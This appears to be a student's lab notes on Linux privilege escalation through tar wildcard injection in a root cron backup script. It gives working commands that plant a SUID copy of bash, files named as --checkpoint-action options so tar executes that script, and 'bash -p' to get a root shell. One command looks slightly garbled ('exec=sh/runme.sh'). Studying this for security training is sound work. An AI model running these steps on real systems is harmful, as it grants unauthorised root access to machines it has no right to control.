In the machine TCM's using, there's another script at /usr/local/bin/compress.sh

Lets have a look at that. 

Basically, it is changing to the /home/user directory and then its taking a backup with a wildcard(\*). Now since there's a wildcard here, we can do an injection. So we can make a script and then we can make that script run by tar.

We'll run the same script that we used in [[Cron Paths]] :

```shell
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > runme.sh

chmod +x runme.sh
```

Now we will do some tar specific commands. 

```shell
touch /home/user/--checkpoint=1

touch /home/user/--checkpoint-action=exec=sh/runme.sh
```

So, what does this do, when the script reads the checkpoint=1, it will display progress messages every 1 number. And whenever you get this checkpoint, do this action. And the action is execute shell and run runme.sh

And now we wait...

Then we run:

```shell
/tmp/bash -p
```

 And hooray, we are root
